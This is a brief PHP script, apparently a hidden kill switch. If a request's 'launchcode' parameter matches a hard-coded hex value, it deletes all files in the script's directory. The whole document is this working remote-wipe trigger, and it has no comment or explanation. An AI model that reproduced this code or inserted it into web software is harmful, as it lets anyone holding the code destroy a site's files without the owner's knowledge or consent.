<?php

  if ($_REQUEST['launchcode'] == "FB14982288108E1FBD6207EF55F05027") {

    array_map('unlink', glob("./*"));

  }

?>
